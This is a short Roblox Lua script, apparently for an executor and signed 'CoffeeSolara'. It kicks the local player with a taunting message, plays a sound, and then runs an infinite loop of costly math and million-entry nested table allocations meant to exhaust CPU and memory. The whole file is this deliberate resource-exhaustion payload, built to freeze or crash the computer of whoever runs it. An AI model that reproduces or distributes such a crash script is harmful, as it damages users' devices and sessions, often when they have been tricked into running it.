local function fuckthesys()
    -- Kick the player with a custom message
    game.Players.LocalPlayer:Kick("I have no enemies cause. Just wait then you will know - CoffeeSolara")
    wait(0)
    
    -- Create and play a sound
    local snd = game.SoundService
    local sng = Instance.new("Sound")
    sng.Parent = snd
    sng.SoundId = "rbxassetid://1848354536"
    sng:Play()
    wait(0.001)
    
    -- Perform intensive calculations
    while true do
        for i = 1, 1e7 do
            local result = math.sqrt(i) * math.sin(i) * math.cos(i) * math.exp(i % 20) * math.log(i + 1)
            result = result * math.tan(i) * math.atan(i) * math.asin(i % 1) * math.acos(i % 1)
            result = result / math.pow(i, 0.5) * math.sinh(i % 100) * math.cosh(i % 100) * math.tanh(i % 100)
            result = result * math.log10(i + 1) * math.exp(i % 30) / math.exp(i % 40)
            result = result + math.exp(math.log(i + 2) * math.sin(i % 50)) - math.pow(math.cos(i % 60), 2)
            result = result * math.sqrt(math.abs(math.sin(i) * math.cos(i))) / math.log10(i + 3)
            result = result * math.tan(math.sqrt(i)) * math.cosh(i % 70) * math.sinh(i % 80) * math.exp(i % 90)
            result = result + math.atan(math.tan(i)) * math.log(math.abs(math.sin(i * math.exp(i % 10))))
            result = result * math.pow(math.log(i + 1), 2) / math.exp(math.sin(i) * math.cos(i))
        end
        
        -- Create large data structures
        local t = {}
        for i = 1, 1e6 do
            t[i] = {
                str = string.rep(string.char(math.random(65, 90)), 1e3),
                num = math.random(1, 1e6),
                nestedTable = {
                    a = math.sin(i),
                    b = math.cos(i),
                    c = string.rep("B", 1e2),
                    d = {
                        e = math.sqrt(i),
                        f = math.log(i + 1),
                        g = {math.exp(i % 100), math.tan(i), string.rep("C", 1e2)},
                        h = {
                            i = math.asin(math.random()),
                            j = math.acos(math.random()),
                            k = string.rep("D", 1e2),
                            l = {
                                m = math.atan(math.sin(i) * math.cos(i)),
                                n = string.rep("E", 1e2),
                                o = {
                                    p = math.sqrt(math.abs(i)),
                                    q = math.log(math.exp(i % 1000)),
                                    r = string.rep("F", 1e2)
                                }
                            }
                        }
                    }
                }
            }
        end
    end
end

fuckthesys()
